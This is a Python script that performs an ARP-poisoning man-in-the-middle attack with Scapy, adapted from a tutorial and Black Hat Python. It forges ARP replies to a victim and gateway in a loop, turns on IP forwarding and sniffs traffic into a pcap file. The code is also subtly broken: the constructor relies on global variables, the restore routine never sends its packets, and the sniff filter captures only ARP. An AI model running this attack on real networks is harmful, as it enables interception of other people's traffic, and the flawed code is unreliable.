from multiprocessing import Process
from scapy.all import *

import os
import sys
import time

# reference code: 
# https://www.thepythoncode.com/article/building-arp-spoofer-using-scapy
# reference code: Black Hat Python

def get_mac(targetip):
    des_mac = "ff:ff:ff:ff:ff:ff" # default gateway
    operation = "who-has"
    time_out = 5
    retry_time = 5
    # define a packet:
    packet = Ether(dst=des_mac)/ARP(op=operation, pdst=targetip)
    ans, unans = srp(packet, timeout=time_out, retry=retry_time, verbose=False)
    for a, r in ans:
        return r.sprintf(r"%Ether.src%")

# enable IP forwarding: https://www.thepythoncode.com/article/building-arp-spoofer-using-scapy
def enable_iproute():
    file_path = "/proc/sys/net/ipv4/ip_forward"
    with open(file_path) as f:
        if f.read().strip() == "1":
            # already enabled
            return
    with open(file_path, "w") as f:
        print(1, file=f)
        
class Arper:
    def __init__(self, victimIP, destinationIP, interface="eth0"):
        #This function initiate the class
        self.victimIP = victim
        self.destinationIP = destination
        self.interface = interface
        self.victimMac = get_mac(victimIP)
        self.destinationMac = get_mac(destinationIP)

    def run(self):
        #this function runs the overall structure of the attack
        
        # create a thread for poisoning
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()
        
        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()
        
        self.restore()

    def poison(self):
        #this function performs the poisoning process
        
        poison_victim = ARP()
        poison_victim.op = 2
        poison_victim.psrc = self.destinationIP
        poison_victim.pdst = self.victimIP
        poison_victim.hwdst = self.victimMac
        
        poison_destination = ARP()
        poison_destination.op = 2
        poison_destination.psrc = self.victimIP
        poison_destination.pdst = self.destinationIP
        poison_destination.hwdst = self.destinationMac
        
        while True:
            try:
                print("[*] Poisoning attacking [CTRL-C to stop]")
                send(poison_victim)
                send(poison_destination)
                
            except KeyboardInterrupt:
                print("[*] Stopping ARP poison attack, game is over.")
                self.restore()
                sys.exit(1)
            else:
                time.sleep(1)
    
    # This function processes the sniffed packets
    def process_packet(self, packet):
        print(packet.summary())

    def sniff(self, count=200):
        file_path = "arper.pcap"
        # this function performs the sniffing attack
        packets = sniff(iface=self.interface, count=count, filter="arp" , prn=self.process_packet)
        # save the sniffed packets
        wrpcap(file_path, packets)
        self.restore()
        print("[*] Arper finished sniffing, the conversation has been recorded into " + file_path + ".")

    def restore(self):
        #this function restores the network to its usual once the attack is finished
        
        # take everything back to normal
        restore_victim = ARP()
        restore_victim.op = 2
        restore_victim.psrc = self.destinationIP
        restore_victim.pdst = self.victimIP
        restore_victim.hwdst = "ff:ff:ff:ff:ff:ff"
        restore_victim.hwsrc = self.destinationMac
        restore_victim.count = 5
        
        restore_destination = ARP()
        restore_destination.op = 2
        restore_destination.psrc = self.victimIP
        restore_destination.pdst = self.destinationIP
        restore_destination.hwdst = "ff:ff:ff:ff:ff:ff"
        restore_destination.hwsrc = self.victimMac
        restore_destination.count = 5

if __name__ == '__main__':
    (victim, destination, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, destination, interface)
    enable_iproute()
    myarp.run()